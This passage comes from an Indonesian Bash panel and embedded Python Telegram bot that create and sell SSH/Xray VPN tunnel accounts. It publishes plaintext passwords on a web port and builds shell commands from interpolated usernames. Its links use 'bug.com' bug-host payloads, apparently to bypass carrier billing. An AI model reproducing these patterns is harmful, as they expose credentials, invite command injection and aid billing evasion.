    printf "  ${YELLOW}Link gRPC${NC} :\n  %s\n" "$link_grpc"



    echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"



    printf "  ${WHITE}%-16s${NC} : ${YELLOW}1 Jam (Auto Delete)${NC}\n" "Aktif Selama"



    printf "  ${WHITE}%-16s${NC} : %s\n"  "Dibuat"   "$created"



    printf "  ${WHITE}%-16s${NC} : ${RED}%s${NC}\n" "Berakhir" "$exp"



    echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"



    echo ""



    read -rp "  Press any key to back..."



}







#================================================



# CREATE SSH



#================================================







create_ssh() {



    clear



    print_menu_header "CREATE SSH ACCOUNT"



    read -rp "  Username      : " username



    [[ -z "$username" ]] && { echo -e "  ${RED}✘ Required!${NC}"; sleep 2; return; }



    if id "$username" &>/dev/null; then echo -e "  ${RED}✘ User sudah ada!${NC}"; sleep 2; return; fi



    read -rp "  Password      : " password



    [[ -z "$password" ]] && { echo -e "  ${RED}✘ Required!${NC}"; sleep 2; return; }



    read -rp "  Expired (days): " days



    [[ ! "$days" =~ ^[0-9]+$ ]] && { echo -e "  ${RED}✘ Invalid!${NC}"; sleep 2; return; }



    read -rp "  Limit IP      : " iplimit



    [[ ! "$iplimit" =~ ^[0-9]+$ ]] && iplimit=1







    local exp exp_date created ip_vps



    exp=$(date -d "+${days} days" +"%d %b, %Y")



    exp_date=$(date -d "+${days} days" +"%Y-%m-%d")



    created=$(date +"%d %b, %Y")



    ip_vps=$(get_ip)







    if ! useradd -M -s /bin/false -e "$exp_date" "$username" 2>/dev/null; then



        echo -e "  ${RED}✘ Gagal membuat user sistem! Periksa apakah username sudah ada.${NC}"



        sleep 2; return



    fi



    echo "${username}:${password}" | chpasswd







    mkdir -p "$AKUN_DIR"



    printf "USERNAME=%s\nPASSWORD=%s\nIPLIMIT=%s\nEXPIRED=%s\nCREATED=%s\n" \
        "$username" "$password" "$iplimit" "$exp" "$created" \
        > "$AKUN_DIR/ssh-${username}.txt"







    _save_ssh_file "SSH Account" "$username" "$password" "$ip_vps" "$days" "$created" "$exp"



    _print_ssh_result "SSH Account" "$username" "$password" "$ip_vps" "$days" "$created" "$exp"







    send_telegram_admin \
"✅ <b>New SSH Account - Youzin Crabz Tunel</b>



━━━━━━━━━━━━━━━━━━━━━━━━━



👤 Username   : <code>${username}</code>



🔑 Password   : <code>${password}</code>



🌐 Domain     : <code>${DOMAIN}</code>



🖥️ IP VPS     : <code>${ip_vps}</code>



━━━━━━━━━━━━━━━━━━━━━━━━━



🔌 OpenSSH    : 22



🔌 Dropbear   : 222



🔌 SSL/TLS    : 443



🔌 BadVPN UDP : 7100-7300



━━━━━━━━━━━━━━━━━━━━━━━━━



📅 Dibuat     : ${created}



⏳ Berakhir   : ${exp}



🔗 Download   : http://${ip_vps}:81/ssh-${username}.txt



━━━━━━━━━━━━━━━━━━━━━━━━━



<i>Powered by The Professor</i>"







    read -rp "  Press any key to back..."



}







#================================================



# SSH TRIAL



#================================================







create_ssh_trial() {



    local suffix; suffix=$(cat /proc/sys/kernel/random/uuid | tr -d '-' | head -c 4 | tr '[:lower:]' '[:upper:]')



    local username="Trial-${suffix}" password="1" ip_vps exp exp_date created



    ip_vps=$(get_ip)



    exp=$(date -d "+1 hour" +"%d %b, %Y %H:%M")



    exp_date=$(date -d "+1 days" +"%Y-%m-%d")



    created=$(date +"%d %b, %Y %H:%M")







    if ! useradd -M -s /bin/false -e "$exp_date" "$username" 2>/dev/null; then



        echo -e "  ${RED}✘ Gagal membuat user sistem! Periksa apakah username sudah ada.${NC}"



        sleep 2; return



    fi



    echo "${username}:${password}" | chpasswd







    mkdir -p "$AKUN_DIR"



    printf "USERNAME=%s\nPASSWORD=%s\nIPLIMIT=1\nEXPIRED=%s\nCREATED=%s\nTRIAL=1\n" \
        "$username" "$password" "$exp" "$created" > "$AKUN_DIR/ssh-${username}.txt"







    (



        sleep 3600



        userdel -f "$username" 2>/dev/null



        rm -f "$AKUN_DIR/ssh-${username}.txt"



        rm -f "$PUBLIC_HTML/ssh-${username}.txt"



    ) &



    disown $!







    _save_ssh_file "Trial SSH (1 Jam)" "$username" "$password" "$ip_vps" "1 Jam (Auto Delete)" "$created" "$exp"



    _print_ssh_result "Trial SSH (1 Jam)" "$username" "$password" "$ip_vps" "1 Jam" "$created" "$exp"







    send_telegram_admin \
"🆓 <b>SSH Trial - Youzin Crabz Tunel</b>



━━━━━━━━━━━━━━━━━━━━━━━━━



👤 Username : <code>${username}</code>



🔑 Password : <code>${password}</code>



🌐 Domain   : <code>${DOMAIN}</code>



🖥️ IP VPS   : <code>${ip_vps}</code>



━━━━━━━━━━━━━━━━━━━━━━━━━



⏰ Aktif    : 1 Jam (Auto Delete)



📅 Expired  : ${exp}



━━━━━━━━━━━━━━━━━━━━━━━━━



<i>Powered by The Professor</i>"







    read -rp "  Press any key to back..."



}







#================================================



# SSH HELPERS



#================================================







_save_ssh_file() {



    local title="$1" username="$2" password="$3" ip_vps="$4" days="$5" created="$6" exp="$7"



    mkdir -p "$PUBLIC_HTML"



    cat > "$PUBLIC_HTML/ssh-${username}.txt" << SSHFILE



━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━



  YOUZIN CRABZ TUNEL - ${title}



  The Professor



━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━



 Username         : ${username}



 Password         : ${password}



 IP/Host          : ${ip_vps}



 Domain SSH       : ${DOMAIN}



 OpenSSH          : 22



 Dropbear         : 222



 Port SSH UDP     : 1-65535



 SSL/TLS          : 443



 SSH Ws Non SSL   : 80



 SSH Ws SSL       : 443



 BadVPN UDPGW     : 7100,7200,7300



 Format Hc        : ${DOMAIN}:80@${username}:${password}



━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━



 Save Link        : http://${ip_vps}:81/ssh-${username}.txt



━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━



 Payload          : GET / HTTP/1.1[crlf]Host: ${DOMAIN}[crlf]Upgrade: ws[crlf][crlf]



━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━



 Aktif Selama     : ${days}



 Dibuat Pada      : ${created}



 Berakhir Pada    : ${exp}



━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━



SSHFILE



}







_print_ssh_result() {



    local title="$1" username="$2" password="$3" ip_vps="$4" days="$5" created="$6" exp="$7"



    clear



    echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"



    echo -e "  ${WHITE}${BOLD}YOUZIN CRABZ TUNEL${NC} — ${YELLOW}${title}${NC}"



    echo -e "  ${DIM}The Professor${NC}"



    echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"



    printf "  ${WHITE}%-16s${NC} : ${GREEN}%s${NC}\n" "Username"       "$username"



    printf "  ${WHITE}%-16s${NC} : ${GREEN}%s${NC}\n" "Password"       "$password"



    printf "  ${WHITE}%-16s${NC} : ${GREEN}%s${NC}\n" "IP/Host"        "$ip_vps"



    printf "  ${WHITE}%-16s${NC} : ${GREEN}%s${NC}\n" "Domain SSH"     "$DOMAIN"



    echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"



    printf "  ${WHITE}%-16s${NC} : %s\n" "OpenSSH"        "22"



    printf "  ${WHITE}%-16s${NC} : %s\n" "Dropbear"       "222"



    printf "  ${WHITE}%-16s${NC} : %s\n" "Port SSH UDP"   "1-65535"



    printf "  ${WHITE}%-16s${NC} : %s\n" "SSL/TLS"        "443"



    printf "  ${WHITE}%-16s${NC} : %s\n" "SSH Ws Non SSL" "80"



    printf "  ${WHITE}%-16s${NC} : %s\n" "SSH Ws SSL"     "443"



    printf "  ${WHITE}%-16s${NC} : %s\n" "BadVPN UDPGW"   "7100,7200,7300"



    printf "  ${WHITE}%-16s${NC} : %s:80@%s:%s\n" "Format Hc" "$DOMAIN" "$username" "$password"



    echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"



    printf "  ${WHITE}%-16s${NC} : http://%s:81/ssh-%s.txt\n" "Save Link" "$ip_vps" "$username"



    echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"



    printf "  ${WHITE}%-16s${NC} : GET / HTTP/1.1[crlf]Host: %s[crlf]Upgrade: ws[crlf][crlf]\n" "Payload" "$DOMAIN"



    echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"



    printf "  ${WHITE}%-16s${NC} : ${YELLOW}%s${NC}\n"    "Aktif Selama"  "$days"



    printf "  ${WHITE}%-16s${NC} : %s\n"                   "Dibuat Pada"   "$created"



    printf "  ${WHITE}%-16s${NC} : ${RED}%s${NC}\n"        "Berakhir Pada" "$exp"



    echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"



    echo ""



    # QR Code jika qrencode tersedia



    if command -v qrencode >/dev/null 2>&1; then



        echo -e "  ${CYAN}[q]${NC} Tampilkan QR Code SSH  ${CYAN}[Enter]${NC} Lanjut"



        read -rp "  " qr_choice



        if [[ "$qr_choice" == "q" || "$qr_choice" == "Q" ]]; then



            clear



            echo -e "  ${YELLOW}QR Code — SSH Import:${NC}"



            echo ""



            local qr_data="${DOMAIN}:80@${username}:${password}"



            qrencode -t ANSIUTF8 "$qr_data" 2>/dev/null || echo -e "  ${RED}QR gagal${NC}"



            echo ""; read -rp "  Tekan Enter..."; clear



        fi



    fi



}







#================================================



# INSTALL QRENCODE (dipanggil saat buat akun pertama)



#================================================







_ensure_qrencode() {



    command -v qrencode >/dev/null 2>&1 && return 0



    apt-get install -y qrencode >/dev/null 2>&1 && return 0



    return 1



}







delete_account() {



    local protocol="$1"



    clear; print_menu_header "DELETE ${protocol^^}"



    shopt -s nullglob



    local files=("$AKUN_DIR"/${protocol}-*.txt)



    shopt -u nullglob



    if [[ ${#files[@]} -eq 0 ]]; then echo -e "  ${RED}No accounts!${NC}"; sleep 2; return; fi



    for f in "${files[@]}"; do



        local n e



        n=$(basename "$f" .txt | sed "s/${protocol}-//")



        e=$(grep "EXPIRED" "$f" 2>/dev/null | cut -d= -f2-)



        echo -e "  ${CYAN}▸${NC} $n ${YELLOW}($e)${NC}"



    done



    echo ""



    read -rp "  Username to delete: " username



    [[ -z "$username" ]] && return



    if [[ -n "$username" ]]; then



        local tmp; tmp=$(mktemp)



        jq --arg email "$username" \
           'del(.inbounds[].settings.clients[]? | select(.email == $email))' \
           "$XRAY_CONFIG" > "$tmp" 2>/dev/null



        if jq empty "$tmp" 2>/dev/null && [[ -s "$tmp" ]]; then



            mv "$tmp" "$XRAY_CONFIG"



        else



            rm -f "$tmp"



        fi



        fix_xray_permissions



        if xray -test -config "$XRAY_CONFIG" >/dev/null 2>&1; then



            systemctl restart xray 2>/dev/null



        fi



        rm -f "$AKUN_DIR/${protocol}-${username}.txt"



        rm -f "$PUBLIC_HTML/${protocol}-${username}.txt"



        [[ "$protocol" == "ssh" ]] && userdel -f "$username" 2>/dev/null



        echo -e "  ${GREEN}✔ Deleted: ${username}${NC}"



        sleep 2



    fi



}







renew_account() {



    local protocol="$1"



    clear; print_menu_header "RENEW ${protocol^^}"



    shopt -s nullglob



    local files=("$AKUN_DIR"/${protocol}-*.txt)



    shopt -u nullglob



    if [[ ${#files[@]} -eq 0 ]]; then echo -e "  ${RED}No accounts!${NC}"; sleep 2; return; fi



    for f in "${files[@]}"; do



        local n e



        n=$(basename "$f" .txt | sed "s/${protocol}-//")



        e=$(grep "EXPIRED" "$f" 2>/dev/null | cut -d= -f2-)



        echo -e "  ${CYAN}▸${NC} $n ${YELLOW}($e)${NC}"



    done



    echo ""



    read -rp "  Username to renew: " username



    [[ -z "$username" ]] && return



    [[ ! -f "$AKUN_DIR/${protocol}-${username}.txt" ]] && { echo -e "  ${RED}✘ Not found!${NC}"; sleep 2; return; }



    read -rp "  Add days: " days



    [[ ! "$days" =~ ^[0-9]+$ ]] && { echo -e "  ${RED}✘ Invalid!${NC}"; sleep 2; return; }



    local new_exp new_exp_date current_exp



    current_exp=$(grep "EXPIRED" "$AKUN_DIR/${protocol}-${username}.txt" 2>/dev/null | cut -d= -f2-)



    if [[ -n "$current_exp" ]]; then



        new_exp=$(date -d "${current_exp} + ${days} days" +"%d %b, %Y" 2>/dev/null)



        new_exp_date=$(date -d "${current_exp} + ${days} days" +"%Y-%m-%d" 2>/dev/null)



    fi



    [[ -z "$new_exp" ]] && new_exp=$(date -d "+${days} days" +"%d %b, %Y")



    [[ -z "$new_exp_date" ]] && new_exp_date=$(date -d "+${days} days" +"%Y-%m-%d")



    sed -i "s/EXPIRED=.*/EXPIRED=${new_exp}/" "$AKUN_DIR/${protocol}-${username}.txt"



    [[ "$protocol" == "ssh" ]] && chage -E "$new_exp_date" "$username" 2>/dev/null



    echo -e "  ${GREEN}✔ Renewed! Exp: ${new_exp}${NC}"



    sleep 3



}







list_accounts() {



    local protocol="$1"



    clear



    local W; W=$(get_width)



    shopt -s nullglob



    local files=("$AKUN_DIR"/${protocol}-*.txt)



    shopt -u nullglob



    _box_top $W



    _box_center $W "${YELLOW}${BOLD}${protocol^^} ACCOUNT LIST${NC}"



    _box_divider $W



    if [[ ${#files[@]} -eq 0 ]]; then



        _box_center $W "${RED}Tidak ada akun!${NC}"



        _box_bottom $W



        echo ""; sleep 2; return



    fi



    _box_row $W "USERNAME" "EXPIRED / QUOTA / TYPE"



    _box_divider $W



    for f in "${files[@]}"; do



        local uname exp quota trial ttype



        uname=$(basename "$f" .txt | sed "s/${protocol}-//")



        exp=$(grep "EXPIRED" "$f" 2>/dev/null | cut -d= -f2-)



        quota=$(grep "QUOTA" "$f" 2>/dev/null | cut -d= -f2)



        trial=$(grep "TRIAL" "$f" 2>/dev/null | cut -d= -f2)



        ttype="Member"; [[ "$trial" == "1" ]] && ttype="Trial"



        _box_row $W "${uname}" "${exp}  ${quota:-?}GB  ${ttype}"



    done



    _box_divider $W



    _box_left $W "Total: ${GREEN}${#files[@]}${NC} akun"



    _box_bottom $W



    echo ""



    read -rp "  Tekan Enter untuk kembali..."



}







check_user_login() {



    local protocol="$1"



    clear; print_menu_header "ACTIVE ${protocol^^} LOGINS"



    if [[ "$protocol" == "ssh" ]]; then



        echo -e "  ${WHITE}Active SSH sessions:${NC}"



        who 2>/dev/null || echo "  None"



        echo ""



        echo -e "  ${WHITE}Login count:${NC}"



        who 2>/dev/null | awk '{print $1}' | sort | uniq -c | sort -rn



    else



        echo -e "  ${WHITE}Xray ${protocol^^} log:${NC}"



        if [[ -f /var/log/xray/access.log ]]; then



            grep -i "$protocol" /var/log/xray/access.log 2>/dev/null | tail -20 || echo "  No data"



        else



            echo "  No log"



        fi



    fi



    echo ""



    read -rp "  Press any key to back..."



}







#================================================



# SETUP TELEGRAM BOT (vpn-bot)



#================================================







setup_telegram_bot() {



    clear



    print_menu_header "SETUP TELEGRAM BOT"



    echo -e "  ${YELLOW}Cara mendapatkan Bot Token:${NC}"



    echo -e "  1. Buka Telegram cari ${WHITE}@BotFather${NC}"



    echo -e "  2. Ketik /newbot ikuti instruksi"



    echo -e "  3. Copy TOKEN yang diberikan"



    echo ""



    echo -e "  ${YELLOW}Cara mendapatkan Chat ID:${NC}"



    echo -e "  1. Cari ${WHITE}@userinfobot${NC} di Telegram"



    echo -e "  2. Ketik /start lihat ID kamu"



    echo ""



    read -rp "  Bot Token     : " bot_token



    [[ -z "$bot_token" ]] && { echo -e "  ${RED}✘ Token required!${NC}"; sleep 2; return; }



    read -rp "  Admin Chat ID : " admin_id



    [[ -z "$admin_id" ]] && { echo -e "  ${RED}✘ Chat ID required!${NC}"; sleep 2; return; }



    echo -e "  ${CYAN}Testing token...${NC}"



    local test_result bot_name



    test_result=$(curl -s --max-time 10 "https://api.telegram.org/bot${bot_token}/getMe")



    if ! echo "$test_result" | grep -q '"ok":true'; then



        echo -e "  ${RED}✘ Token tidak valid!${NC}"; sleep 2; return



    fi



    bot_name=$(echo "$test_result" | python3 -c "



import sys,json



d=json.load(sys.stdin)



print(d['result']['username'])



" 2>/dev/null)



    echo -e "  ${GREEN}✔ Bot valid! @${bot_name}${NC}"



    echo ""



    read -rp "  Nama Pemilik Rekening : " rek_name



    read -rp "  Nomor Rek/Dana/GoPay  : " rek_number



    read -rp "  Bank / E-Wallet       : " rek_bank



    read -rp "  Harga per Bulan (Rp)  : " harga



    [[ ! "$harga" =~ ^[0-9]+$ ]] && harga=10000







    echo "$bot_token" > "$BOT_TOKEN_FILE"



    echo "$admin_id"  > "$CHAT_ID_FILE"



    chmod 600 "$BOT_TOKEN_FILE" "$CHAT_ID_FILE"







    cat > "$PAYMENT_FILE" << PAYEOF



REK_NAME=${rek_name}



REK_NUMBER=${rek_number}



REK_BANK=${rek_bank}



HARGA=${harga}



PAYEOF



    chmod 600 "$PAYMENT_FILE"

    # Pastikan Python3 tersedia sebelum install bot service
    command -v python3 >/dev/null 2>&1 || {
        echo -e "  ${CYAN}Installing Python3...${NC}"
        apt-get install -y python3 python3-pip >/dev/null 2>&1 || true
    }

    _install_bot_service



    sleep 2



    if systemctl is-active --quiet vpn-bot; then



        echo -e "  ${GREEN}✔ Bot aktif! @${bot_name}${NC}"



        curl -s -X POST \
            "https://api.telegram.org/bot${bot_token}/sendMessage" \
            -d chat_id="$admin_id" \
            -d text="✅ Youzin Crabz Tunel Bot Aktif!



Domain: ${DOMAIN}



Powered by The Professor" \
            -d parse_mode="HTML" \
            --max-time 10 >/dev/null 2>&1



    else



        echo -e "  ${RED}✘ Bot gagal start!${NC}"



        journalctl -u vpn-bot -n 10 --no-pager



    fi



    echo ""



    read -rp "  Press any key to back..."



}







#================================================



# INSTALL BOT SERVICE (vpn-bot)



# Link gRPC diupdate ke port 443



#================================================







_install_bot_service() {



    mkdir -p /root/bot "$ORDER_DIR"



    pip_install requests







    cat > /root/bot/bot.py << 'BOTEOF'



#!/usr/bin/env python3



# -*- coding: utf-8 -*-



import os, json, time, subprocess



import threading



from datetime import datetime, timedelta







try:



    import requests



    from requests.adapters import HTTPAdapter



    from urllib3.util.retry import Retry



except ImportError:



    os.system('pip3 install requests --break-system-packages -q')



    import requests



    from requests.adapters import HTTPAdapter



    from urllib3.util.retry import Retry







TOKEN     = open('/root/.bot_token').read().strip()



ADMIN_ID  = int(open('/root/.chat_id').read().strip())



DOMAIN    = open('/root/domain').read().strip() if os.path.exists('/root/domain') else 'N/A'



ORDER_DIR = '/root/orders'



AKUN_DIR  = '/root/akun'



HTML_DIR  = '/var/www/html'



API       = f'https://api.telegram.org/bot{TOKEN}'







os.makedirs(ORDER_DIR, exist_ok=True)



os.makedirs(AKUN_DIR,  exist_ok=True)



os.makedirs(HTML_DIR,  exist_ok=True)







user_state = {}



state_lock = threading.Lock()







def make_session():



    s = requests.Session()



    retry = Retry(total=2, backoff_factor=0.3, status_forcelist=[500,502,503,504])



    adapter = HTTPAdapter(max_retries=retry, pool_connections=20, pool_maxsize=50)



    s.mount('https://', adapter)



    s.mount('http://', adapter)



    return s







SESSION = make_session()







def get_payment():



    info = {'REK_NAME':'N/A','REK_NUMBER':'N/A','REK_BANK':'N/A','HARGA':'10000'}



    try:



        with open('/root/.payment_info') as f:



            for line in f:



                line = line.strip()



                if '=' in line:



                    k,v = line.split('=',1)



                    info[k.strip()] = v.strip()



    except: pass



    return info







def api_post(method, data, timeout=6):



    try:



        r = SESSION.post(f'{API}/{method}', data=data, timeout=timeout)



        return r.json()



    except Exception as e:



        print(f'API {method}: {e}', flush=True)



        return {}







def send(chat_id, text, markup=None, parse_mode='HTML'):



    data = {'chat_id':chat_id,'text':text,'parse_mode':parse_mode}



    if markup: data['reply_markup'] = json.dumps(markup)



    return api_post('sendMessage', data)







def answer_cb(cb_id, text='', alert=False):



    api_post('answerCallbackQuery', {'callback_query_id':cb_id,'text':text,'show_alert':alert})







def get_updates(offset=0):



    try:



        r = SESSION.get(f'{API}/getUpdates', params={'offset':offset,'timeout':15,'limit':100}, timeout=20)



        return r.json().get('result', [])



    except: return []







def kb_main():



    return {'keyboard':[



        ['🆓 Trial Gratis','🛒 Order VPN'],



        ['📋 Cek Akun Saya','ℹ️ Info Server'],



        ['❓ Bantuan','📞 Hubungi Admin']



    ],'resize_keyboard':True,'one_time_keyboard':False}







def kb_trial():



    return {'inline_keyboard':[



        [{'text':'🔵 SSH','callback_data':'trial_ssh'},{'text':'🟢 VMess','callback_data':'trial_vmess'}],



        [{'text':'🟡 VLess','callback_data':'trial_vless'},{'text':'🔴 Trojan','callback_data':'trial_trojan'}],



        [{'text':'◀️ Kembali','callback_data':'back_main'}]



    ]}







def kb_order():



    return {'inline_keyboard':[



        [{'text':'🔵 SSH','callback_data':'order_ssh'},{'text':'🟢 VMess','callback_data':'order_vmess'}],



        [{'text':'🟡 VLess','callback_data':'order_vless'},{'text':'🔴 Trojan','callback_data':'order_trojan'}],



        [{'text':'◀️ Kembali','callback_data':'back_main'}]



    ]}







def kb_confirm(order_id):



    return {'inline_keyboard':[[



        {'text':'✅ Konfirmasi','callback_data':f'confirm_{order_id}'},



        {'text':'❌ Tolak','callback_data':f'reject_{order_id}'}



    ]]}







def kb_cancel():



    return {'inline_keyboard':[[{'text':'❌ Batalkan','callback_data':'cancel_order'}]]}







def get_ip():



    for url in ['https://ifconfig.me','https://ipinfo.io/ip','https://api.ipify.org']:



        try:



            r = SESSION.get(url, timeout=3)



            if r.status_code == 200: return r.text.strip()



        except: pass



    return 'N/A'







def run_cmd(cmd):



    try:



        r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=90)



        return r.stdout.strip()



    except Exception as e:



        print(f'CMD: {e}', flush=True)



        return ''







def save_order(oid, data):



    with open(f'{ORDER_DIR}/{oid}.json','w') as f: json.dump(data, f, indent=2)







def load_order(oid):



    p = f'{ORDER_DIR}/{oid}.json'



    if not os.path.exists(p): return None



    with open(p) as f: return json.load(f)







def get_pending():



    orders = []



    if not os.path.exists(ORDER_DIR): return orders



    for fn in os.listdir(ORDER_DIR):



        if not fn.endswith('.json'): continue



        try:



            with open(f'{ORDER_DIR}/{fn}') as f: d = json.load(f)



            if d.get('status') == 'pending': orders.append(d)



        except: pass



    return orders







def make_ssh(username, password, days=30):



    exp_date = (datetime.now() + timedelta(days=days)).strftime('%Y-%m-%d')



    exp_str  = (datetime.now() + timedelta(days=days)).strftime('%d %b, %Y')



    created  = datetime.now().strftime('%d %b, %Y')



    run_cmd(f'useradd -M -s /bin/false -e {exp_date} {username} 2>/dev/null')



    run_cmd(f'echo "{username}:{password}" | chpasswd')



    with open(f'{AKUN_DIR}/ssh-{username}.txt','w') as f:



        f.write(f'USERNAME={username}\nPASSWORD={password}\nIPLIMIT=1\nEXPIRED={exp_str}\nCREATED={created}\n')



    ip = get_ip()



    with open(f'{HTML_DIR}/ssh-{username}.txt','w') as f:



        f.write(f'YOUZIN CRABZ TUNEL - SSH\nUsername: {username}\nPassword: {password}\nExpired: {exp_str}\n')



    return exp_str, ip







def make_xray(protocol, username, days=30, quota=100):



    import uuid as uuidlib, base64



    uid      = str(uuidlib.uuid4())



    exp_str  = (datetime.now() + timedelta(days=days)).strftime('%d %b, %Y')



    created  = datetime.now().strftime('%d %b, %Y')



    cfg      = '/usr/local/etc/xray/config.json'



    if protocol == 'vmess':



        cmd = f'jq --arg uuid "{uid}" --arg email "{username}" \'(.inbounds[] | select(.tag | startswith("vmess")).settings.clients) += [{{"id":$uuid,"email":$email,"alterId":0}}]\' {cfg} > /tmp/xr.json && mv /tmp/xr.json {cfg}'



    elif protocol == 'vless':



        cmd = f'jq --arg uuid "{uid}" --arg email "{username}" \'(.inbounds[] | select(.tag | startswith("vless")).settings.clients) += [{{"id":$uuid,"email":$email}}]\' {cfg} > /tmp/xr.json && mv /tmp/xr.json {cfg}'



    elif protocol == 'trojan':



        cmd = f'jq --arg password "{uid}" --arg email "{username}" \'(.inbounds[] | select(.tag | startswith("trojan")).settings.clients) += [{{"password":$password,"email":$email}}]\' {cfg} > /tmp/xr.json && mv /tmp/xr.json {cfg}'



    run_cmd(cmd)



    run_cmd(f'chmod 644 {cfg}')



    run_cmd('systemctl restart xray 2>/dev/null || true')



    with open(f'{AKUN_DIR}/{protocol}-{username}.txt','w') as f:



        f.write(f'UUID={uid}\nQUOTA={quota}\nIPLIMIT=1\nEXPIRED={exp_str}\nCREATED={created}\n')



    ip = get_ip()



    # TLS=443, NonTLS=80, gRPC=443



    if protocol == 'vmess':



        j_tls = f'{{"v":"2","ps":"{username}","add":"bug.com","port":"443","id":"{uid}","aid":"0","net":"ws","path":"/{protocol}","type":"none","host":"{DOMAIN}","tls":"tls"}}'



        link_tls  = "vmess://" + base64.b64encode(j_tls.encode()).decode()



        j_ntls = f'{{"v":"2","ps":"{username}","add":"bug.com","port":"80","id":"{uid}","aid":"0","net":"ws","path":"/{protocol}","type":"none","host":"{DOMAIN}","tls":"none"}}'



        link_ntls = "vmess://" + base64.b64encode(j_ntls.encode()).decode()



        j_grpc = f'{{"v":"2","ps":"{username}","add":"{DOMAIN}","port":"443","id":"{uid}","aid":"0","net":"grpc","path":"{protocol}-grpc","type":"none","host":"bug.com","tls":"tls"}}'



        link_grpc = "vmess://" + base64.b64encode(j_grpc.encode()).decode()



    elif protocol == 'vless':



        link_tls  = f"vless://{uid}@bug.com:443?path=%2F{protocol}&security=tls&encryption=none&host={DOMAIN}&type=ws&sni={DOMAIN}#{username}-TLS"



        link_ntls = f"vless://{uid}@bug.com:80?path=%2F{protocol}&security=none&encryption=none&host={DOMAIN}&type=ws#{username}-NonTLS"



        link_grpc = f"vless://{uid}@{DOMAIN}:443?mode=gun&security=tls&encryption=none&type=grpc&serviceName={protocol}-grpc&sni=bug.com#{username}-gRPC"



    elif protocol == 'trojan':



        link_tls  = f"trojan://{uid}@bug.com:443?path=%2F{protocol}&security=tls&host={DOMAIN}&type=ws&sni={DOMAIN}#{username}-TLS"



        link_ntls = f"trojan://{uid}@bug.com:80?path=%2F{protocol}&security=none&host={DOMAIN}&type=ws#{username}-NonTLS"



        link_grpc = f"trojan://{uid}@{DOMAIN}:443?mode=gun&security=tls&type=grpc&serviceName={protocol}-grpc&sni=bug.com#{username}-gRPC"



    return (uid, exp_str, ip, link_tls, link_ntls, link_grpc)







def fmt_ssh_msg(username, password, ip, exp_str, title, durasi="30 Hari"):



    return f'''✅ <b>{title}</b>



━━━━━━━━━━━━━━━━━━━━━━━━━



👤 Username : <code>{username}</code>



🔑 Password : <code>{password}</code>



🌐 Domain   : <code>{DOMAIN}</code>



🖥️ IP VPS   : <code>{ip}</code>



━━━━━━━━━━━━━━━━━━━━━━━━━



⏰ Aktif    : {durasi}



📅 Expired  : {exp_str}



━━━━━━━━━━━━━━━━━━━━━━━━━



<i>The Professor</i>'''







def fmt_xray_msg(protocol, username, uid, ip, exp_str, link_tls, link_ntls, link_grpc, title, durasi="30 Hari"):



    return f'''✅ <b>{title}</b>



━━━━━━━━━━━━━━━━━━━━━━━━━



👤 Username : <code>{username}</code>



🔑 UUID     : <code>{uid}</code>



🌐 Domain   : <code>{DOMAIN}</code>



🖥️ IP VPS   : <code>{ip}</code>



━━━━━━━━━━━━━━━━━━━━━━━━━



🔗 <b>Link TLS (443):</b>



<code>{link_tls}</code>



━━━━━━━━━━━━━━━━━━━━━━━━━



🔗 <b>Link NonTLS (80):</b>



<code>{link_ntls}</code>



━━━━━━━━━━━━━━━━━━━━━━━━━



🔗 <b>Link gRPC (443):</b>



<code>{link_grpc}</code>



━━━━━━━━━━━━━━━━━━━━━━━━━



⏰ Aktif  : {durasi}



📅 Expired: {exp_str}



━━━━━━━━━━━━━━━━━━━━━━━━━



<i>The Professor</i>'''







def do_trial(protocol, chat_id):



    ts = datetime.now().strftime('%H%M%S')



    username = f'trial-{ts}'



    ip = get_ip()



    exp_1h = (datetime.now() + timedelta(hours=1)).strftime('%d %b %Y %H:%M')



    if protocol == 'ssh':



        password = '1'



        exp_date = (datetime.now() + timedelta(days=1)).strftime('%Y-%m-%d')



        run_cmd(f'useradd -M -s /bin/false -e {exp_date} {username} 2>/dev/null')



        run_cmd(f'echo "{username}:{password}" | chpasswd')



        run_cmd(f'(sleep 3600; userdel -f {username} 2>/dev/null; rm -f {AKUN_DIR}/ssh-{username}.txt {HTML_DIR}/ssh-{username}.txt) & disown')



        msg = fmt_ssh_msg(username, password, ip, exp_1h, 'Trial SSH Berhasil! 🆓', '1 Jam (Auto Hapus)')



        msg += '\n⚠️ <i>Auto hapus setelah 1 jam</i>'



        send(chat_id, msg, markup=kb_main())



    else:



        try:



            uid, _, ip, link_tls, link_ntls, link_grpc = make_xray(protocol, username, days=1, quota=1)



        except Exception as e:



            send(chat_id, f'❌ Gagal buat akun: {e}'); return



